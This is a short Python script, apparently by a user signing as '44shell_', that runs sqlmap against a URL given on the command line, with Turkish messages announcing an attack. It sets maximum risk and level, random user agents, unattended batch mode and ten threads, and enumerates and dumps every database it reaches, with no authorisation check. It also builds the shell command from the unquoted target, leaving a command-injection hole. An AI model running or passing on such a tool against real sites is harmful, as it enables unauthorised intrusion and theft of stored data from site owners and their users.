#44shell_
import os
import sys
import subprocess

def run_sqlmap(target):
    print("[*] Şu adrese saldırı başlatılıyor: {}".format(target))
    sqlmap_command = "sqlmap -u {} --risk=3 --level=5 --random-agent --user-agent -v3 --batch --threads=10 --dbs --dump".format(target)
    subprocess.call(sqlmap_command, shell=True)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Kullanım: python sqlmapoto.py <hedef_url>")
        sys.exit(1)

    target = sys.argv[1]
    run_sqlmap(target)
    print("by 44shell_")
